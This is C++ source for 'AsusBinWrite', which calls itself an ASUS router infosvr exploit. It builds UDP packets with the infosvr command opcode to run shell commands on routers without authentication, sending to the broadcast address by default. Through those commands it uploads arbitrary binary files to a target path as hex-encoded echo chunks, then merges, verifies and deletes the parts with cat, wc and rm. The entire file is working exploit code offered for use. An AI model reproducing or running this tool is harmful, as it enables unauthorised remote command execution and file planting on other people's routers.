// AsusCmd.cpp: определяет точку входа для консольного приложения.
//

#include "stdafx.h"
#pragma comment(lib, "ws2_32.lib")
#include "..\Common\includes\InfosvrDefines.h"
#include "..\Common\includes\InfosvrExploit.h"

#define BIN_BLOCK_MAX 51	// max block size (bytes) for single part of file (when encoding 1 bin byte => 4 char bytes)
#define MERGE_THRESHOLD 100	// merge after every NUM parts
#define FIRST_PART_NO 1
#define FIRST_CHUNK_NO 0

enum FileUploadingFlags
{
	FU_FLAG_NOFLAG = 0,
	FU_FLAG_APPEND = 1,
	FU_FLAG_RESUME = 2,
	FU_FLAG_TERSE = 4,
	FU_FLAG_IPSET = 8
};

char* sizeBytesToBinPfxStr10(double bytes)
{
#define BUF 16
	char* strSize = (char*)malloc(BUF*sizeof(char));
	if (bytes < 1000)
		sprintf_s(strSize, BUF*sizeof(char), "%.2fB", bytes);
	else if (bytes < 1024 * 1000)
		sprintf_s(strSize, BUF*sizeof(char), "%.2fKB", bytes / 1024);
	else if (bytes < 1024 * 1024 * 1000)
		sprintf_s(strSize, BUF*sizeof(char), "%.2fMB", bytes / 1024 / 1024);
	else
		sprintf_s(strSize, BUF*sizeof(char), "%.2fGB", bytes / 1024 / 1024 / 1024);
	return strSize;
}

char* timeSecToHHMMSS(int sec)
{
#define BUF 16
	char* strMinSec = (char*)malloc(BUF*sizeof(char));

	if (sec/60/60 > 0)
	{
		sprintf_s(strMinSec, BUF*sizeof(char), "%02d:%02d:%02d", sec/60/60, sec/60%60, sec%60);
	}
	else
	{
		sprintf_s(strMinSec, BUF*sizeof(char), "%02d:%02d", sec/60, sec%60);
	}

	return strMinSec;
}

enum VERIFY_RESULT
{
	VERIFY_RES_OK = 1,
	VERIFY_RES_FAIL,
	VERIFY_RES_LOST,
	VERIFY_RES_ERROR
};

BOOL mergeParts(char* writePath, int iChunk, int iMaxPart, int* fu_flags, SOCKET sock, SOCKADDR_IN* targetAddr, int timeout_ms)
{
	char pdubuf[INFO_PDU_LENGTH];	// output buffer
	memset(pdubuf, 0, sizeof(pdubuf));
	IBOX_COMM_PKT_HDR_EX *phdr_ex = (IBOX_COMM_PKT_HDR_EX*)pdubuf;				// output buffer header
	phdr_ex->ServiceID	= NET_SERVICE_ID_IBOX_INFO;	// MUST be such
	phdr_ex->PacketType = NET_PACKET_TYPE_CMD;		// MUST be such
	phdr_ex->OpCode		= NET_CMD_ID_MANU_CMD;		// to exec system commands
	PKT_SYSCMD *syscmd = (PKT_SYSCMD*)(pdubuf+sizeof(IBOX_COMM_PKT_HDR_EX));	// output buffer body

	char cmdPreamble[] = "cat";
	char cmdPostamble[MAXINFOSVRCMD - sizeof(cmdPreamble)];
	char partName[MAXINFOSVRCMD/2]; // to store single part filename
	char cmdParts[MAXINFOSVRCMD];	// to store several filenames
	int iPart2Process = FIRST_PART_NO;
	int firstPartOfCat = iPart2Process;	// bottom parts border of each cmd
	sprintf_s(cmdParts, sizeof(cmdParts), "echo -n \"\">>%s;wc -c<%s", writePath, writePath);
	do // query current size of target file
	{
		strcpy_s(cmdPostamble, sizeof(cmdPostamble), execSysCmd(cmdParts, sock, targetAddr, timeout_ms, EC_FLAG_SILENT));
	} while (stricmp(cmdPostamble, RES_LOST_MARK) == 0);	// repeat if fail
	int nPrevSize = atoi(cmdPostamble);
	VERIFY_RESULT verifyRes = VERIFY_RES_OK;

	while (iPart2Process <= iMaxPart || verifyRes == VERIFY_RES_FAIL)
	{
		if (verifyRes == VERIFY_RES_OK)	// if prev cmd OK - prepare new cmd
		{
			firstPartOfCat = iPart2Process;
			phdr_ex->Info = 0;	// response not interested

			if (*fu_flags&FU_FLAG_APPEND)
			{
				sprintf_s(cmdPostamble, sizeof(cmdPostamble), ">>%s;", writePath);	// prepare postamble
			}
			else
			{
				sprintf_s(cmdPostamble, sizeof(cmdPostamble), ">%s;", writePath);		// prepare postamble
				nPrevSize = 0;
				*fu_flags |= FU_FLAG_APPEND;
			}

			memset(cmdParts, 0, sizeof(cmdParts));
			do 
			{
				sprintf_s(partName, sizeof(partName), " %s_%d-%d", writePath, iChunk, iPart2Process++);	// part filename
				strcat_s(cmdParts, sizeof(cmdParts), partName);	// add part filename to filenames list

				sprintf_s(partName, sizeof(partName), " %s_%d-%d", writePath, iChunk, iPart2Process);	// next part filename (to check strlen)
			} while (strlen(cmdPreamble)+strlen(cmdParts)+strlen(cmdPostamble)+strlen(partName) <= MAXINFOSVRCMD
				&& iPart2Process <= iMaxPart);	// if enough space in cmd AND processed not all parts

			strncpy_s((char*)syscmd->cmd, sizeof(syscmd->cmd), cmdPreamble, SYSCMDBUF_MAX);	// place preamble to buffer
			strcat_s((char*)syscmd->cmd, sizeof(syscmd->cmd), cmdParts);					// place filenames
			strcat_s((char*)syscmd->cmd, sizeof(syscmd->cmd), cmdPostamble);				// place postamble
			syscmd->len = strlen((char*)syscmd->cmd);										// place cmd size to buffer 
		}

		if (!verifyCmdSizeOK(syscmd->len))
		{
			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}

		int nSent = sendto(sock, pdubuf, sizeof(pdubuf), 0, (SOCKADDR*)targetAddr, sizeof(*targetAddr));	// send cmd
		if (nSent == SOCKET_ERROR)
		{
			char wsaErr[8];
			sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
			printf_s("\nmergeParts(): Failed to send data through SOCKET.\tWSA error: %s\n", wsaErr);
			char system_cmd[80];
			sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
			system(system_cmd);

			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}
		if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("Merging to %s parts %d..%d (%d pcs; cmd: %d ch).. ", writePath,
			iChunk*MERGE_THRESHOLD+firstPartOfCat, iChunk*MERGE_THRESHOLD+iPart2Process-1, 
			iPart2Process-firstPartOfCat, syscmd->len);

		//***	Verify merge success	***//
		do
		{
			sprintf_s(cmdParts, sizeof(cmdParts), "wc -c<%s", writePath);	// cmd to request target file size
			int nNewSize = atoi(execSysCmd(cmdParts, sock, targetAddr, timeout_ms, EC_FLAG_SILENT));
			if (nNewSize > nPrevSize)
			{	// target file size increased - merge success
				if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("OK (%d B)", nNewSize);
				nPrevSize = nNewSize;
				verifyRes = VERIFY_RES_OK;
			}
			else if (nNewSize == nPrevSize)
			{	// target file size not changed - merge fail, it's possible to try again
				if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("Fail (%d B)", nNewSize);
				verifyRes = VERIFY_RES_FAIL;
			}
			else if (nNewSize == 0)
			{	// likely LOST size request packet
				verifyRes = VERIFY_RES_LOST;
			}
			else
			{	// target file was removed
				printf_s("\nmergeParts(): Target partial file was removed, so previous parts data lost. Its present size is %d B\n", nNewSize);

				closesocket(sock);
				WSACleanup();
				exit(EXIT_FAILURE);
			} 
		} while (verifyRes == VERIFY_RES_LOST);

		if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("\n"); 
	}
	sprintf_s(cmdParts, sizeof(cmdParts), "rm %s_%d-*;ls %s_%d-*|wc -l", writePath, iChunk, writePath, iChunk);
	do // remove parts of merged chunk
	{
		strcpy_s(cmdPostamble, sizeof(cmdPostamble), execSysCmd(cmdParts, sock, targetAddr, timeout_ms, EC_FLAG_SILENT));
	} while ((stricmp(cmdPostamble, RES_LOST_MARK) == 0) || atoi(cmdPostamble) != 0);	// repeat if fail

	return TRUE;
}

VERIFY_RESULT verifyPartSentOK(IBOX_COMM_PKT_HDR_EX* phdr_ex, BYTE* bytesBin, int nBytes, int* fu_flags, SOCKET sock, SOCKADDR_IN* targetAddr, int timeout_ms)
{
	IBOX_COMM_PKT_RES_EX responses[RECV_MAX];	// headers of responses
	memset(responses, 0, sizeof(responses));
	fd_set fdSet;
	TIMEVAL timVal;
	timVal.tv_sec = 0;
	timVal.tv_usec = timeout_ms*1000;

	char pdubuf_res[INFO_PDU_LENGTH];	// receive buffer
	IBOX_COMM_PKT_RES_EX *phdr_res	= (IBOX_COMM_PKT_RES_EX*)pdubuf_res;							// receive buffer header
	PKT_SYSCMD_RES *syscmd_res		= (PKT_SYSCMD_RES*)(pdubuf_res+sizeof(IBOX_COMM_PKT_RES_EX));	// receive buffer body

	VERIFY_RESULT vrPartOK;

	for (int i = 0; i < RECV_MAX; i++)
	{
		FD_ZERO(&fdSet);
		FD_SET(sock, &fdSet);
		int sss = select(NULL, &fdSet, NULL, NULL, &timVal);	// socket select status
		if (sss == SOCKET_ERROR)	// ERROR
		{
			char wsaErr[8];
			sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
			printf_s("\nverifyPartSentOK(): Error checking SOCKET status.\tWSA error: %s\n", wsaErr);
			char system_cmd[80];
			sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
			system(system_cmd);

			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}
		else if (sss == NULL)	// TIMEOUT (No packets)
		{
			if (!(*fu_flags&FU_FLAG_TERSE) && i == RECV_MAX-1) printf_s(RES_LOST_MARK);
			vrPartOK = VERIFY_RES_LOST;
			continue;	// wait other responses
			//break;	// do not wait other responses
		}
		// OK, packet available
		int recvLen;
		if (!(*fu_flags&FU_FLAG_IPSET))
		{	// when user not specified target - we work with first available only 
			sss = sizeof(*targetAddr);
			recvLen = recvfrom(sock, pdubuf_res, sizeof(pdubuf_res), 0, (SOCKADDR*)targetAddr, &sss);	// receive response
		}
		else
		{	// when user specified target - dont change targetAddr struct
			recvLen = recvfrom(sock, pdubuf_res, sizeof(pdubuf_res), 0, NULL, NULL);	// receive response
		}
		
		if (recvLen == SOCKET_ERROR)
		{
			char wsaErr[8];
			sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
			printf_s("\nverifyPartSentOK(): Failed to receive data through SOCKET.\tWSA error: %s\n", wsaErr);
			char system_cmd[80];
			sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
			system(system_cmd);

			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}

		if (phdr_res->ServiceID == NET_SERVICE_ID_IBOX_INFO && phdr_res->OpCode == NET_CMD_ID_MANU_CMD)
		{
			if (phdr_res->PacketType == NET_PACKET_TYPE_CMD)	// usually our broadcast packet
			{
				i--;	// to receive other RIGHT packet instead
				if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("%c", 253);	// received our broadcast packet
				continue;	// get next
			}
			else if (phdr_res->PacketType == NET_PACKET_TYPE_RES)	// response
			{
				if (phdr_res->Info != phdr_ex->Info)
				{	// unexpected packet (usually from previous transactions)
					i--;	// to receive other RIGHT packet instead
					if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("%c", 249);
					continue;	// get next
				}

				BOOL bNewInfo = TRUE;
				for (int j = 0; j < RECV_MAX; j++)	// maybe such packet already received?
				{
					if (responses[j].Info == phdr_res->Info && 
						memcmp(responses[j].MacAddress, phdr_res->MacAddress, sizeof(phdr_res->MacAddress)) == 0)
					{	// if already received
						if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("%c", 254);	// print 'duplicate' sign
						bNewInfo = FALSE;
						break;
					}
				}

				if (bNewInfo)
				{
					if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("%s: ", inet_ntoa(targetAddr->sin_addr));

					if (memcmp(syscmd_res->res, bytesBin, nBytes) == 0)
					{
						if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("OK");
						vrPartOK = VERIFY_RES_OK;
					}
					else
					{
						if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("Fail");
						vrPartOK = VERIFY_RES_FAIL;
					}

					responses[i].Info = phdr_res->Info;								// save response ID
					memcpy_s(responses[i].MacAddress, sizeof(responses[i].MacAddress), 
						phdr_res->MacAddress, sizeof(phdr_res->MacAddress));// save response MacAddress
				}
			}
			else
			{	// unknown packet type
				if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("%c", 15);
				continue;	// get next
			}
		}
		else
		{	// unknown service/cmd packet
			if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("%c", 15);
			continue;	// get next
		}

		if (vrPartOK == VERIFY_RES_OK)	// if part confirmed - its no sense to wait other responses
		{
			break;
		}
	}
	return vrPartOK;
}

int uploadFile(FILE* srcFile, char* targetIP, char* targetPath, int* fu_flags, int verifyTimeout)
{
	//// Typical system cmd by infosvr:
	//// system("echo -ne "\x0C\xFF\x00\xB0">/var/myFile.0;cat /var/myFile.0 > /tmp/syscmd.out");
	//// where
	//// @" > /tmp/syscmd.out" is hardcoded in infosvr
	//// @"echo -ne "\x0C\xFF\x00\xB0">/var/myFile.0;cat /var/myFile.0" is our command
	//// in which
	//// "echo -ne \"" is preamble
	//// @"\x0C\xFF\x00\xB0" is data
	//// @">/var/myFile.0;cat /var/myFile.0" is postamble

	fseek(srcFile, 0, SEEK_END);	// to get file size
	int fileSize = ftell(srcFile);	// get file size
	rewind(srcFile);				// go to start of file

	//***	Setup socket and addresses	***//
	SOCKET sock = NULL;
	SOCKADDR_IN localAddr, targetAddr;
	setupNetworking(targetIP, &sock, &localAddr, &targetAddr);

	char pdubuf[INFO_PDU_LENGTH];	// output buffer
	memset(pdubuf, 0, sizeof(pdubuf));
	IBOX_COMM_PKT_HDR_EX *phdr_ex = (IBOX_COMM_PKT_HDR_EX*)pdubuf;				// output buffer header
	phdr_ex->ServiceID	= NET_SERVICE_ID_IBOX_INFO;	// MUST be such
	phdr_ex->PacketType = NET_PACKET_TYPE_CMD;		// MUST be such
	phdr_ex->OpCode		= NET_CMD_ID_MANU_CMD;		// to exec system commands
	PKT_SYSCMD *syscmd = (PKT_SYSCMD*)(pdubuf+sizeof(IBOX_COMM_PKT_HDR_EX));	// output buffer body

	BOOL bUploadComplete = FALSE;
	int iUnmergedPart = FIRST_PART_NO-1;	// number of unmerged parts on target (partNo)
	int iUnmergedChunk = FIRST_CHUNK_NO;	// chunk number to merge
	int nBytesSentOK = 0;	// verified bytes sent
	char cmdPreamble[] = "echo -ne \"";
	char cmdPostamble[MAXINFOSVRCMD - sizeof(cmdPreamble)];
	BYTE bytesBin[(MAXINFOSVRCMD-sizeof(cmdPreamble)-sizeof("\">/var/f_2;cat /var/f_2"))/4]; // binary file part (max theoretical binary part)
	char bytesStr[sizeof(bytesBin)*4+1];	// encoded file bytes (string like @"\x0C\xFF\x00\xB0" + '\0')
	char byteStr[10];						// single encoded file byte (string like @"\xFF" + '\0')
	clock_t prevSendClock = 0;	// to calc Bps (instantaneous for part)

	if (*fu_flags&FU_FLAG_RESUME)
	{
		sprintf_s(cmdPostamble, sizeof(cmdPostamble), "echo -n \"\">>%s;wc -c<%s", targetPath, targetPath);
		do // query current size of target file
		{
			strcpy_s(bytesStr, sizeof(bytesStr), execSysCmd(cmdPostamble, sock, &targetAddr, verifyTimeout, EC_FLAG_SILENT));
		} while (stricmp(bytesStr, RES_LOST_MARK) == 0);	// repeat if fail
		nBytesSentOK = atoi(bytesStr);
		
		if (nBytesSentOK==fileSize)
		{
			printf_s("File '%s' is already fully uploaded.\n", targetPath);
			bUploadComplete = TRUE;
		}
		else if (nBytesSentOK>fileSize)
		{
			printf_s("File on target '%s' have size greater than source file. Error?\n", targetPath);
			bUploadComplete = TRUE;
		}
		else
		{
			fseek(srcFile, nBytesSentOK, SEEK_SET);
			printf_s("Will RESUME uploading '%s' by offset %d\n", targetPath, nBytesSentOK);
		}
	}

	int nBytesMergedOK = nBytesSentOK;	// to calc Bps (average for chunk)
	clock_t prevMergeClock = clock();	// to calc Bps (average for chunk)

	while (!bUploadComplete)
	{
		iUnmergedPart++;			// processing next part
		phdr_ex->Info = clock();	// transaction ID
		sprintf_s(cmdPostamble, sizeof(cmdPostamble), "\">%s_%d-%d;cat %s_%d-%d", 
			targetPath, iUnmergedChunk, iUnmergedPart, targetPath, iUnmergedChunk, iUnmergedPart); // prepare Postamble
		int nBytes2Send = (MAXINFOSVRCMD-strlen(cmdPreamble)-strlen(cmdPostamble))/4;	// bytes available = chars available/(4chars-per-byte)
		int nRead = fread_s(bytesBin, sizeof(bytesBin), 1, nBytes2Send, srcFile);		// read bytes from file

		if (ftell(srcFile) == fileSize)	// reached EOF
		{
			bUploadComplete = TRUE;
		}

		memset(bytesStr, 0, sizeof(bytesStr));	// clear buffer
		for (int i = 0; i < nRead; i++)
		{
			sprintf_s(byteStr, sizeof(byteStr), "\\x%.2x", bytesBin[i]);	// encode single byte
			strcat_s(bytesStr, sizeof(bytesStr), byteStr);	// add encoded byte to buffer
		}

		strcpy_s((char*)syscmd->cmd, sizeof(syscmd->cmd), cmdPreamble);
		strcat_s((char*)syscmd->cmd, sizeof(syscmd->cmd), bytesStr);
		strcat_s((char*)syscmd->cmd, sizeof(syscmd->cmd), cmdPostamble);
		syscmd->len = strlen((char*)syscmd->cmd);

		if (!verifyCmdSizeOK(syscmd->len))
		{
			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}

		int nSent = sendto(sock, pdubuf, sizeof(pdubuf), 0, (SOCKADDR*)&targetAddr, sizeof(targetAddr));	// send cmd
		if (nSent == SOCKET_ERROR)
		{
			char wsaErr[8];
			sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
			printf_s("\nuploadFile(): Failed to send data through SOCKET.\tWSA error: %s\n", wsaErr);
			char system_cmd[80];
			sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
			system(system_cmd);

			closesocket(sock);
			WSACleanup();
			exit(EXIT_FAILURE);
		}

		if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("%2.1f%%\t%2.1f Bps\tpart %d (%d B; cmd: %d ch)  ", 
			1.*(nBytesSentOK+nRead)/fileSize*100, 1.*nRead/(1.*(clock()-prevSendClock)/CLOCKS_PER_SEC), 
			iUnmergedChunk*MERGE_THRESHOLD+iUnmergedPart, nRead, syscmd->len);
		prevSendClock = clock();

		VERIFY_RESULT verifyRes = verifyPartSentOK(phdr_ex, bytesBin, nRead, fu_flags, sock, &targetAddr, verifyTimeout);
		switch (verifyRes)
		{
		case VERIFY_RES_OK:		// part on target correct
			nBytesSentOK += nRead;
			break;
		case VERIFY_RES_FAIL:	// part on target incorrect - try again
		case VERIFY_RES_LOST:	// no response - try again
			iUnmergedPart--;
			bUploadComplete = FALSE;
			fseek(srcFile, -nRead, SEEK_CUR);
			break;
		default:
			printf_s("verifyPartSentOK() ERROR");
			exit(EXIT_FAILURE);
			break;
		} 
		if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("\n");

		if (iUnmergedPart >= MERGE_THRESHOLD || bUploadComplete)
		{
			mergeParts(targetPath, iUnmergedChunk, iUnmergedPart, fu_flags, sock, &targetAddr, verifyTimeout);
			iUnmergedChunk++;
			iUnmergedPart = 0;

			double avgBps = 1.*(nBytesSentOK-nBytesMergedOK)/(1.*(clock()-prevMergeClock)/CLOCKS_PER_SEC);
			nBytesMergedOK = nBytesSentOK;	// comment to calc AVG speed over all chunks
			prevMergeClock = clock();		// uncomment to calc AVG speed by last chunk
			printf_s("Written %s/%s  %2.1f Bps (avg)  Remaining: %s (%s/%s)\n",
				sizeBytesToBinPfxStr10(nBytesSentOK), sizeBytesToBinPfxStr10(fileSize),		// bytes ready/total
				avgBps,
				timeSecToHHMMSS((fileSize-nBytesSentOK)/avgBps),	// guessed remaining
				timeSecToHHMMSS(clock()/CLOCKS_PER_SEC),			// elapsed
				timeSecToHHMMSS(clock()/CLOCKS_PER_SEC+(fileSize-nBytesSentOK)/avgBps)	// guessed total
				);
			if (!(*fu_flags&FU_FLAG_TERSE)) printf_s("\n");
		}
	}	// while (!bUploadComplete)
	fclose(srcFile);

	sprintf_s(cmdPostamble, sizeof(cmdPostamble), "echo -n \"\">>%s;wc -c<%s", targetPath, targetPath);
	do // query current size of target file
	{
		strcpy_s(bytesStr, sizeof(bytesStr), execSysCmd(cmdPostamble, sock, &targetAddr, verifyTimeout, EC_FLAG_SILENT));
	} while (stricmp(bytesStr, RES_LOST_MARK) == 0);	// repeat if fail
	nBytesMergedOK = atoi(bytesStr);

	if (nBytesMergedOK < nBytesSentOK)
	{
		printf_s("Oh, no! Something went wrong.\a\a\a\n");
		printf_s("File size on target is smaller than the source file.\n");
	}

	if (closesocket(sock) == SOCKET_ERROR)
	{
		char wsaErr[8];
		sprintf_s(wsaErr, sizeof(wsaErr), "%d", WSAGetLastError());
		printf_s("\nuploadFile(): Failed to close SOCKET.\tWSA error: %s\n", wsaErr);
		char system_cmd[80];
		sprintf_s(system_cmd, sizeof(system_cmd), "net helpmsg %s", wsaErr);
		system(system_cmd);

		WSACleanup();
		exit(EXIT_FAILURE);
	}
	return nBytesMergedOK;
}

int _tmain(int argc, _TCHAR* argv[])
{
	int timeout_msec = 500;
	int uploadFlags = FU_FLAG_NOFLAG;
	char *file2write, *path2write;
	char *targetIP = "255.255.255.255";	// if target not specified - broadcast

	if (argc <= 2)
	{
		printf_s("AsusBinWrite v1.21\n");
		printf_s("The ASUS Router infosvr exploit.\n");
		printf_s("Licensed under GPL (http://www.gnu.org/licenses/gpl.html)\n");
		printf_s("Copyright 2015 TishSerg, Ukraine\n\n");
		printf_s("Usage: AsusBinWrite <file2write> <path2write> [<target_ip> [APPEND] [RESUME] [TERSE]]\n");
		//for (int i = 0; i < 256; i++)
		//{
		//	printf_s("%d\t->%c\n", i, i);
		//}
		return 0;
	}
	if (argc > 2)
	{
		file2write = argv[1];
		path2write = argv[2];
	}
	if (argc > 3)
	{
		targetIP = argv[3];
		uploadFlags |= FU_FLAG_IPSET;
	}
	if (argc > 4)
	{
		for (int i = 4; i < argc; i++)
		{
			if (stricmp(argv[i], "APPEND") == 0)
			{
				uploadFlags |= FU_FLAG_APPEND;
			}
			else if (stricmp(argv[i], "RESUME") == 0)
			{
				uploadFlags |= FU_FLAG_APPEND;	// resume implies appending
				uploadFlags |= FU_FLAG_RESUME;
			}
			else if (stricmp(argv[i], "TERSE") == 0)
			{
				uploadFlags |= FU_FLAG_TERSE;
			}
			else
			{
				printf_s("Unrecognized option: '%s'\tIt will be ignored.\n", argv[i]);
			}
		}
	}

	//***	Open file	***//
	FILE *file;
	if (fopen_s(&file, file2write, "rb") != 0)	// try open file
	{
		printf_s("Error opening file '%s'. Terminating.\a\a\n", file2write);
		return EXIT_FAILURE;
	}

	//***	Send file	***//
	printf_s("Start uploading file to %s...\nSource file: '%s'\tTarget file: '%s'\n", targetIP, file2write, path2write);
	int res_size = uploadFile(file, targetIP, path2write, &uploadFlags, timeout_msec);

	//***	Exit program	***//
	WSACleanup();
	printf_s("Finished. File size on target is %s. Working time: %s (%d sec)\a\n", 
		sizeBytesToBinPfxStr10(res_size), timeSecToHHMMSS(clock()/CLOCKS_PER_SEC), clock()/CLOCKS_PER_SEC);
	return 0;
}
